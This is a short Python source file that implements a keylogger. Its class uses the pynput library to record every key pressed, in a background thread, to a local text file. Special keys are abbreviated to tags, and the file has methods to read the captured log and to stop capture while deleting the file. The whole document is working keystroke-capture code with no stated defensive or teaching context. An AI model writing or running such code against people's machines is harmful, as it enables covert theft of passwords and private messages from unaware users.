from pynput.keyboard import Listener
import threading
import re
import os

class KL:
	button = []
	count = 0
	path = 'log_output.txt'

	def s_listen(self):
		global listener
		with Listener(on_press=self.key_pressed) as listener:
			listener.join()

	def s_logger(self):
		self.t = threading.Thread(target=self.s_listen)
		self.t.start()

	def key_pressed(self, key):
		self.button.append(key)
		self.count += 1
		if self.count >= 1:
			self.count = 0
			with open(self.path, 'a') as file:
				for i in self.button:
					i = re.sub("'", "", str(i))
					if i == "Key.enter":
						file.write("\n")
					elif i in ("Key.shift",
								"Key.shift_r",
								"Key.ctrl",
								"Key.escape"):
						pass
					elif i == "Key.backspace":
						file.write(" [bs] ")
					elif i == "Key.space":
						file.write(" ")
					elif i == "Key.tab":
						file.write(" [T] ")
					elif i == "Key.caps_lock":
						file.write(" [cl] ")
					elif i == "Key.left":
						file.write(" [L] ")
					elif i == "Key.right":
						file.write(" [R] ")
					elif i == "Key.up":
						file.write(" [U] ")
					elif i == "Key.down":
						file.write(" [D] ")
					elif i == "Key.alt":
						file.write(" [alt] ")
					elif i == "Key.alt_l":
						file.write(" [al] ")
					elif i == "Key.alt_r":
						file.write(" [ar] ")
					elif i == "Key.alt_gr":
						file.write(" [agr] ")
					elif i == "Key.home":
						file.write(" [H] ")
					elif i == "Key.end":
						file.write(" [E] ")
					elif i == "Key.page_up":
						file.write(" [PU] ")
					elif i == "Key.page_down":
						file.write(" [PD] ")
					elif i == "Key.f1":
						file.write(" [F1] ")
					elif i == "Key.f2":
						file.write(" [F2] ")
					elif i == "Key.f3":
						file.write(" [F3] ")
					elif i == "Key.f4":
						file.write(" [F4] ")
					elif i == "Key.f5":
						file.write(" [F5] ")
					elif i == "Key.f6":
						file.write(" [F6] ")
					elif i == "Key.f7":
						file.write(" [F7] ")
					elif i == "Key.f8":
						file.write(" [F8] ")
					elif i == "Key.f9":
						file.write(" [F9] ")
					elif i == "Key.f10":
						file.write(" [F10] ")
					elif i == "Key.f11":
						file.write(" [F11] ")
					elif i == "Key.f12":
						file.write(" [F12] ")
					else:
						file.write(i)

		self.button = []

	def r_log(self):
		with open('log_output.txt', 'r') as file:
			data = file.read()
			return data

	def st_listen(self):
		listener.stop()
		os.remove(self.path)
